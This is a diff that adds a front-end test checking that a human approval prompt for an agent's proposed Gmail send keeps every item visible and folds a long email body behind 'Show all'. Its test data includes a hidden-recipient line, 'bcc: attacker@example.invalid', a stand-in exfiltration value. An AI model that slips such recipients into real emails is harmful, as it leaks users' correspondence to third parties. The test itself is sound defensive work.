@@ -40,3 +40,21 @@ describe("a proposal that updates a saved brief (T25)", () => {
     expect(changes.querySelector(".added")).toHaveTextContent("Count the invented teapots.");
   });
 });
+
+describe("what the Lead asks you to approve (H3)", () => {
+  it("keeps every item under the Lead's line, folding a long one with Show all", () => {
+    const body = "body: " + "Dear client, thank you for the invented order. ".repeat(16);
+    render(
+      <Lines
+        lines={[{ key: "g", kind: "lead", text: "I'd like to use composio.gmail.SEND_EMAIL.",
+          items: ["bcc: attacker@example.invalid", body] }]}
+      />,
+    );
+    expect(screen.getByText("bcc: attacker@example.invalid")).toBeInTheDocument();
+    const more = screen.getByRole("button", { name: /Show all \(/ });
+    expect(screen.queryByText(body)).not.toBeInTheDocument();
+    fireEvent.click(more);
+    expect(screen.getByRole("button", { name: "Show less" })).toBeInTheDocument();
+    expect(document.body.textContent).toContain(body.trim());
+  });
+});
